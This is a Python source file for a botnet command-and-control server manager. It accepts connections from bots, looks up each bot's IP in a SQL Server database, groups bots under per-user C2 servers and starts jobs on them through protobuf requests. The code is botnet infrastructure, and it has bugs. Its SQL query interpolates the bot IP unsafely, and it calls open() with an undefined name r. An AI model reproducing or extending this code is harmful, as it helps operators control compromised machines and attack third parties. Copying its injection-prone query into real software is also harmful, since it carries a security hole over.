import threading
import socket
import sys
import json
import pyodbc

import c2_pb2

import command
import c2server
from botnet_exceptions import *


class ServerManager():
    def __init__(self):
        self.commands_in_process = []
        self.c2servers = {}
        self.connection_string = self.get_connection_string("botnet")


    def get_connection_string(self, database):
        f = open("databaseconfig.json", r)
        config = json.load(f)

        driver = "{ODBC Driver 17 for SQL Server}"
        databaseconfig = config["botnet"]
        server = databaseconfig["Server"]
        database = databaseconfig["Database"]
        uid = databaseconfig["UID"]
        pwd = databaseconfig["PWD"]

        return "Driver="+driver+";Server="+server+";Database="+database+";UID="+uid+";PWD="+pwd+";"


    def start_job(self, request):
        try:
            # TODO: maybe this doesn't work (does function return same object?)
            c2server = self.c2servers[request.userId]
        except KeyError:
            c2server = self.spawn_c2server(request.userId)
        
        try:
            response = c2server.start_job(request.commandId)
        except:
            response = c2_pb2.StartJobResponse()
            response.response = c2_pb2.StartJobResponse.Response.FAIL

        return response


    def listen_for_bots(self, bot_entry_address):
        """
        Listen for incoming bots
        :return: None
        """
        bots_socket = self.create_listen_socket(bot_entry_address)

        while True:
            try:
                bot_socket, bot_address = bots_socket.accept()
            except:
                print("[-] Accepting bot connection failed")
                break

            bot_ip = bot_address[0]

            db = pyodbc.connect(self.connection_string)
            with db:
                cursor = db.cursor()
                cursor.execute(f"SELECT * FROM Bot WHERE IP='{bot_ip}'")

                if cursor.rowcount == 0:
                    print("[-] IP doesn't exist in the database")
                    bot_socket.sendall(b"IP doesn't exist in the database")
                    bot_socket.close()
                    break
                
                row = cursor.fetchone()
                user_id = row[1]

                try:
                    c2server = self.c2servers[user_id]
                except KeyError:
                    c2server = self.spawn_c2server(user_id)

                bot = Bot(bot_address, bot_socket, user_id)

                c2server.add_bot(bot)


    def spawn_c2server(self, user_id):
        """
        Spawn new C2 server when no available bot cluster is present
        :param user_id: str
        :return: C2server
        """
        c2server = C2server(user_id)
        self.c2servers[user_id] = c2server
        return c2server


    def create_listen_socket(self, address):
        try:
            commands_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            commands_socket.bind(address)
            commands_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            commands_socket.listen()
        except:
            print("[-] Commands socket setup failed")
            sys.exit()

        return commands_socket

